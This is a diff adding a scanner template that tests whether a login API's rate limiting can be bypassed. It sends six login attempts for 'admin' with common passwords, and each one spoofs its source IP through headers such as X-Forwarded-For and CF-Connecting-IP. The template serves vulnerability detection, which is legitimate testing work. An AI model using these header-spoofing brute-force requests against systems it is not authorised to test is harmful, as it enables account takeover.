@@ -1,0 +1,124 @@
+id: medium-api-rate-limiting-bypass-distributed
+
+info:
+  name: Distributed Rate Limiting Bypass
+  author: redteam-elite
+  severity: medium
+  description: |
+    Detects distributed rate limiting bypass vulnerabilities where rate limits
+    can be circumvented using multiple IP addresses, proxy chains, or distributed
+    request patterns that exploit weaknesses in rate limiting implementations.
+  reference:
+    - https://owasp.org/www-community/attacks/Testing_for_Weak_lock_out_mechanism
+    - https://portswigger.net/web-security/authentication/password-based
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L
+    cvss-score: 6.3
+    cwe-id: CWE-307
+  tags: api,rate-limiting,bypass,distributed,brute-force,medium
+
+http:
+  - raw:
+      - |
+        POST /api/auth/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        X-Forwarded-For: 192.168.1.100
+        X-Real-IP: 192.168.1.100
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+        {"username":"admin","password":"password123"}
+
+      - |
+        POST /api/auth/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        X-Forwarded-For: 10.0.0.50
+        X-Real-IP: 10.0.0.50
+        X-Originating-IP: 10.0.0.50
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36
+
+        {"username":"admin","password":"admin123"}
+
+      - |
+        POST /api/auth/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        X-Forwarded-For: 172.16.0.25
+        X-Client-IP: 172.16.0.25
+        X-Cluster-Client-IP: 172.16.0.25
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
+
+        {"username":"admin","password":"test123"}
+
+      - |
+        POST /api/auth/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        X-Forwarded-For: 203.0.113.10
+        Via: 1.1 proxy.example.com
+        User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15
+
+        {"username":"admin","password":"password"}
+
+      - |
+        POST /api/auth/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        X-Forwarded-For: 198.51.100.75
+        X-Remote-Addr: 198.51.100.75
+        CF-Connecting-IP: 198.51.100.75
+        User-Agent: Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0
+
+        {"username":"admin","password":"123456"}
+
+      - |
+        POST /api/auth/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        X-Forwarded-For: 127.0.0.1, 192.168.1.200
+        X-Real-IP: 192.168.1.200
+        User-Agent: curl/7.68.0
+
+        {"username":"admin","password":"qwerty"}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 400
+          - 401
+          - 422
+          - 429
+
+      - type: regex
+        part: body
+        regex:
+          - '"error":\s*"invalid.*credentials"'
+          - '"error":\s*"authentication.*failed"'
+          - '"message":\s*"login.*failed"'
+          - '"success":\s*false'
+        condition: or
+
+      - type: regex
+        part: body
+        negative: true
+        regex:
+          - '"error":\s*"rate.*limit.*exceeded"'
+          - '"error":\s*"too.*many.*requests"'
+          - 'rate.*limit.*reached'
+          - 'request.*blocked'
+
+      - type: word
+        part: header
+        negative: true
+        words:
+          - "X-RateLimit-Remaining: 0"
+          - "Retry-After:"
+
+      - type: dsl
+        dsl:
+          - 'status_code != 429'
+
+    stop-at-first-match: true
